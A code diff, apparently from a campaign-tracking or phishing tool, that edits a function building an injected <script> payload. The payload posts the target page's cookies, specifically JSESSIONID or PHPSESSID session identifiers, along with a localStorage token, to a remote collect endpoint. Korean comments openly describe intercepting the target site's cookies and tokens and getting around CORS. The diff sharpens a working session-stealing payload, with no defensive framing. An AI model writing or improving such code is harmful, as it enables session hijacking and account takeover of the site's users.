@@ -48,14 +48,15 @@ function renderPayload() {
     `<script>` +
     `fetch('${baseUrl}/api/collect',{` +
     `method:'POST',` +
-    // CORS 우회를 위해 headers 생략 유지
     `body:JSON.stringify({` +
     `campaign:'${campaign}',` +
     `type:'${eventType}',` +
     `page:location.href,` +
-    // 💡 타겟 사이트의 쿠키를 동적으로 읽고, 백엔드 200자 제한에 걸리지 않도록 190자로 자르는 동적 스크립트 주입
-    `sessionId: (document.cookie || 'no-cookie').substring(0, 190),` + 
-    // 💡 타겟 사이트의 로컬 스토리지에 존재하는 'last_Tabid' 값을 동적으로 가로채는 스크립트 주입
+    // 💡 [핵심] JSESSIONID 또는 PHPSESSID만 매칭해서 가져오고, 없으면 기존 쿠키 일부를 반환합니다.
+    `sessionId: (() => {` +
+    `  const match = document.cookie.match(/(?:JSESSIONID|PHPSESSID)=([^;]+)/);` +
+    `  return match ? match[1] : (document.cookie || 'no-cookie').substring(0, 190);` +
+    `})(),` + 
     `userToken: localStorage.getItem('last_Tabid') || 'no-token-found',` +
     `referrer:document.referrer,` +
     `documentTitle:document.title,` +
